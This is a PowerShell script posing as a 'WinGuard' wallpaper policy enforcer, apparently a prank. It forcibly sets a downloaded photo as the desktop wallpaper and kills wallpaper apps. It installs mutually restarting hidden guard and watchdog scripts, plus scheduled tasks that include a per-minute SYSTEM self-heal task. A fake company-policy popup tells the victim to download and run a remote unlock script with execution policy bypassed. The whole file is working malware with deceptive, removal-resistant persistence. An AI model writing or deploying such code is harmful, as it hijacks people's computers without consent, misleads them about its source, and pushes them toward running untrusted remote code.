# ===== CONFIG =====
$wallpaperUrl = "https://groundviews.org/wp-content/uploads/2014/11/20141121-afp-MaithripalaSirisena.jpg"
$base = "$env:ProgramData\WinGuard"
$guard = "$base\guard.ps1"
$heal = "$base\heal.ps1"
$notice = "$base\notice.ps1"
$image = "$base\wallpaper.jpg"
$backup = "$base\backup.txt"
$watchdog = "$base\watchdog.ps1"

# ===== BANNER =====
Clear-Host
Write-Host ""
Write-Host "  ██╗    ██╗██╗███╗   ██╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ ██████╗ " -ForegroundColor Cyan
Write-Host "  ██║    ██║██║████╗  ██║██╔════╝ ██║   ██║██╔══██╗██╔══██╗██╔══██╗" -ForegroundColor Cyan
Write-Host "  ██║ █╗ ██║██║██╔██╗ ██║██║  ███╗██║   ██║███████║██████╔╝██║  ██║" -ForegroundColor Cyan
Write-Host "  ██║███╗██║██║██║╚██╗██║██║   ██║██║   ██║██╔══██║██╔══██╗██║  ██║" -ForegroundColor Cyan
Write-Host "  ╚███╔███╔╝██║██║ ╚████║╚██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝" -ForegroundColor Cyan
Write-Host "   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ " -ForegroundColor Cyan
Write-Host ""
Write-Host "              [ v2.0  |  Wallpaper Policy Enforcer ]" -ForegroundColor DarkCyan
Write-Host "  ─────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""

function Show-Step {
    param([string]$Message)
    Write-Host "  [" -NoNewline -ForegroundColor DarkGray
    Write-Host " ► " -NoNewline -ForegroundColor Yellow
    Write-Host "]  $Message" -ForegroundColor White
}
function Show-OK {
    param([string]$Message)
    Write-Host "  [" -NoNewline -ForegroundColor DarkGray
    Write-Host " ✔ " -NoNewline -ForegroundColor Green
    Write-Host "]  $Message" -ForegroundColor Gray
}
function Show-Warn {
    param([string]$Message)
    Write-Host "  [" -NoNewline -ForegroundColor DarkGray
    Write-Host " ! " -NoNewline -ForegroundColor Red
    Write-Host "]  $Message" -ForegroundColor DarkYellow
}

Show-Step "Initializing WinGuard..."
New-Item $base -ItemType Directory -Force | Out-Null
Show-OK  "Working directory ready: $base"

# ===== REMOVE EXISTING GROUP POLICY LOCKS =====
Show-Step "Clearing existing policy locks..."
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Name NoChangingWallpaper -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name Wallpaper -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Name NoChangingWallpaper -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name Wallpaper -ErrorAction SilentlyContinue
Show-OK  "Policy locks cleared"

# ===== BACKUP CURRENT WALLPAPER =====
Show-Step "Backing up current wallpaper..."
try {
    (Get-ItemProperty "HKCU:\Control Panel\Desktop").Wallpaper | Out-File $backup -Force
    Show-OK  "Backup saved to: $backup"
} catch {
    Show-Warn "Could not back up current wallpaper"
}

# ===== DOWNLOAD IMAGE =====
Show-Step "Downloading wallpaper image..."
Invoke-WebRequest $wallpaperUrl -OutFile $image -UseBasicParsing
Show-OK  "Wallpaper downloaded"

# ===== APPLY WALLPAPER IMMEDIATELY =====
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
'@
Show-Step "Applying wallpaper..."
Set-ItemProperty "HKCU:\Control Panel\Desktop" Wallpaper $image
Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle 2
Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper 0
# SPI_SETDESKWALLPAPER=0x0014, SPIF_UPDATEINIFILE=0x01, SPIF_SENDCHANGE=0x02
[Wallpaper]::SystemParametersInfo(0x0014, 0, $image, 0x01 -bor 0x02)
Show-OK  "Wallpaper applied"
# Refresh Group Policy to ensure wallpaper setting takes effect immediately
Show-Step "Refreshing Group Policy..."
gpupdate /force | Out-Null
Show-OK  "Group Policy refreshed"

# ===== GUARD SCRIPT =====
Show-Step "Writing guard script..."
@"
`$img = '$image'
`$noticeScript = '$notice'
`$watchdogScript = '$watchdog'

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
'@

# Spawn watchdog if not already running
if (-not (Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { `$_.CommandLine -like '*watchdog.ps1*' })) {
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File '`$watchdogScript'"
}

while (`$true) {

    'Lively','WallpaperEngine','livelywpf','wallpaper32','wallpaper64' | ForEach-Object {
        Get-Process -Name `$_ -ErrorAction SilentlyContinue | Stop-Process -Force
    }

    # If wallpaper was changed, notify user and revert
    `$current = (Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name Wallpaper -ErrorAction SilentlyContinue).Wallpaper
    if (`$current -ne `$img) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File '`$noticeScript'"
    }

    Set-ItemProperty "HKCU:\Control Panel\Desktop" Wallpaper `$img
    Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle 2
    Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper 0
    # SPI_SETDESKWALLPAPER=0x0014, SPIF_UPDATEINIFILE=0x01, SPIF_SENDCHANGE=0x02
    [Wallpaper]::SystemParametersInfo(0x0014, 0, `$img, 0x01 -bor 0x02)

    # Lock wallpaper again using our own policy
    New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Force | Out-Null
    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" NoChangingWallpaper 1

    # Ensure watchdog is still running
    if (-not (Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
            Where-Object { `$_.CommandLine -like '*watchdog.ps1*' })) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File '`$watchdogScript'"
    }

    Start-Sleep 30
}
"@ | Out-File $guard -Encoding UTF8 -Force
Show-OK  "Guard script written"

# ===== SELF HEAL SCRIPT =====
Show-Step "Writing self-heal script..."
@"
if (!(Get-ScheduledTask -TaskName WinGuard -ErrorAction SilentlyContinue)) {
    schtasks /create /tn WinGuard /sc onlogon /rl highest /tr `"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $guard`"
}
if (!(Get-ScheduledTask -TaskName WinGuard-Watchdog -ErrorAction SilentlyContinue)) {
    schtasks /create /tn WinGuard-Watchdog /sc onlogon /rl highest /tr `"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $watchdog`"
}
"@ | Out-File $heal -Encoding UTF8 -Force
Show-OK  "Self-heal script written"

# ===== PRANK MESSAGE =====
Show-Step "Writing notice script..."
@"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show(
"Your wallpaper is managed by company policy.``n``nThis device has been pranked by Sahindu 😄``n``nChanges are restricted by the system administrator.``n``nTo remove this protection:``n 1. Download unlock.ps1 from:``n    https://raw.githubusercontent.com/SahiDemon/IDMfix/main/unlock.ps1``n 2. Run: powershell -ExecutionPolicy Bypass -File unlock.ps1``n``n(Password required)",
"Company Policy Notice",
"OK",
"Warning"
)
"@ | Out-File $notice -Encoding UTF8 -Force
Show-OK  "Notice script written"

# ===== WATCHDOG SCRIPT =====
Show-Step "Writing watchdog script..."
@"
`$guardScript = '$guard'

while (`$true) {
    if (-not (Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
            Where-Object { `$_.CommandLine -like '*guard.ps1*' })) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File '`$guardScript'"
    }
    Start-Sleep 30
}
"@ | Out-File $watchdog -Encoding UTF8 -Force
Show-OK  "Watchdog script written"

# ===== TASKS =====
Show-Step "Registering scheduled tasks..."
Register-ScheduledTask -TaskName "WinGuard" `
 -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $guard") `
 -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
 -RunLevel Highest -Force | Out-Null
Show-OK  "Task registered: WinGuard"

$principalSys = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "WinGuard-Heal" `
 -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $heal") `
 -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) `
 -Principal $principalSys -Force | Out-Null
Show-OK  "Task registered: WinGuard-Heal"

Register-ScheduledTask -TaskName "WinGuard-Notice" `
 -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $notice") `
 -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
 -RunLevel Highest -Force | Out-Null
Show-OK  "Task registered: WinGuard-Notice"

Register-ScheduledTask -TaskName "WinGuard-Watchdog" `
 -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $watchdog") `
 -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
 -RunLevel Highest -Force | Out-Null
Show-OK  "Task registered: WinGuard-Watchdog"

# ===== START NOW =====
Show-Step "Starting background services..."
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File $guard"
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File $watchdog"
Show-OK  "Guard and Watchdog launched"

Write-Host ""
Write-Host "  ─────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host "  [" -NoNewline -ForegroundColor DarkGray
Write-Host " ✔ " -NoNewline -ForegroundColor Green
Write-Host "] " -NoNewline -ForegroundColor DarkGray
Write-Host "WinGuard v2 installed successfully!" -ForegroundColor Green
Write-Host "  ─────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""
